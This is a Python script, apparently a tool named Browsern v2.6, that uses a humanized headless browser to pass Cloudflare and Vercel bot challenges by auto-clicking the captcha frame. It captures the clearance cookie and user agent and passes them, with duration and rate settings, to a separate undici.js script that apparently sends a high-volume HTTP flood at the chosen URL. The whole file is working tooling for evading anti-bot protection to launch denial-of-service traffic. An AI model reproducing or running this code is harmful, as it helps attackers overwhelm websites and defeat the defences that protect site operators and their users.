'''
Coded by @udpboy (Neerd) & @Lexy_Tegyo (Lexys) | Browsern v2.6

Features v2.6:
 - Detect Cloudflare Challenge (Just a moment..., Checking your browser)
 - Detect Vercel Security Checkpoint
 - Auto Click Cloudflare Captcha/Turnstile

Cloudflare:
 - Interactive Challenge(Captcha)
 - Managed Challenge(UAM)
 - JavaScript Challenge
 - Turnstile
 - Custom Interactive Challenge(Captcha)
 - Custom Managed Challenge(UAM)

Vercel Challenge

Other JS Challenge

Usage:
 python3 browsern.py <url> <duration> <rates> <threads>
 python3 browsern.py https://captcha.flexystat.dev 300 8 8
'''
import asyncio
import sys
import time
import os
import subprocess
import signal
from browserforge.fingerprints import Screen
from camoufox.async_api import AsyncCamoufox


async def click_cloudflare_checkbox(page):
    try:
        for _ in range(15):
            await asyncio.sleep(0.6)

            for frame in page.frames:
                if frame.url.startswith('https://challenges.cloudflare.com'):
                    frame_element = await frame.frame_element()
                    bounding_box = await frame_element.bounding_box()
                    if not bounding_box:
                        continue  # kalau belum ter-render sempurna

                    coord_x = bounding_box['x']
                    coord_y = bounding_box['y']
                    width = bounding_box['width']
                    height = bounding_box['height']

                    checkbox_x = coord_x + width / 2
                    checkbox_y = coord_y + height / 2
#                    print(checkbox_x, checkbox_y)
                    await page.mouse.click(x=checkbox_x, y=checkbox_y)
    except Exception as e:
        print(f"[Cloudflare Click Error] {e}")
        return False
    finally:
     return True


async def cloudflare_bypass_example(host):
    async with AsyncCamoufox(
        headless=True,
        humanize=True,
        os=["windows"],
        screen=Screen(max_width=1920, max_height=1080),
        args=[
                "--no-sandbox",
                '--disable-setuid-sandbox',
                "--disable-dev-shm-usage",
                "--disable-infobars",
                "--start-maximized",
                '--disable-extensions',
                "--lang=en-US,en;q=0.9",
                "--window-size=1920,1080",
        ]
    ) as browser:
        page = await browser.new_page()
        statuses = {}

        async def handle_response(response):
           status = response.status
           statuses[status] = statuses.get(status, 0) + 1

        page.on("response", handle_response)
        br = await page.goto(host)
        title = await page.title()
        print(f"[INFO] Started Browser | Title: ({title}) | Status: {statuses}")
        await asyncio.sleep(0.8)
        statuses.clear()
        cloudflare = False
        if title == "Just a moment...":
          cloudflare = True
          print("[INFO] Detected Protection ~ Cloudflare Challenge")
          captcha = await click_cloudflare_checkbox(page)
          if captcha:
            print(f"[INFO] Cloudflare Challenge: Solved")

        elif title == "Vercel Security Checkpoint":
           print("[INFO] Detected Protection ~ Vercel Challenge")
           await asyncio.sleep(8)
           await page.mouse.click(x=100, y=350)
           await asyncio.sleep(10)
           await page.mouse.click(x=400, y=600)
           await asyncio.sleep(6)
           solved = True
        else:
          solved = True
          print("[INFO] Waiting 5s for JS challenge...")
          await asyncio.sleep(5)

        await asyncio.sleep(2)
        title2 = await page.title()
        ua = await page.evaluate("() => navigator.userAgent")
        cookies = await page.context.cookies()
        if cloudflare:
          cf_cookie = next((c for c in cookies if c["name"] == "cf_clearance"), None)
          if not cf_cookie:
           solved = False
           print("[INFO] Failed to get Cloudflare Cookie")
          else:
            solved = True

        cookie = " ".join(f"{c['name']}={c['value']}" for c in cookies)
        print(f"[INFO] Page Title: ({title2}) | Status Code: {statuses} | UserAgent: {ua} | Cookies: {cookie}")
        await page.close()
        await browser.close()
        if solved:
           args = [
              "node",
              "undici.js",
              host,
              str(duration),
              str(rates),
              str(ua),
              str(cookie)
           ]

           result = subprocess.run(args, text=True, timeout=duration)
        else:
          await asyncio.sleep(2)
          await cloudflare_bypass_example(host)

def signal_handler(sig, frame):
    print("\n[INFO] Received Ctrl+C signal. Cleaning up all processes")
    sys.exit()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


if __name__ == "__main__":
    host = sys.argv[1]
    duration = int(sys.argv[2])
    rates = sys.argv[3]
    threads = sys.argv[4]
    asyncio.run(cloudflare_bypass_example(host))
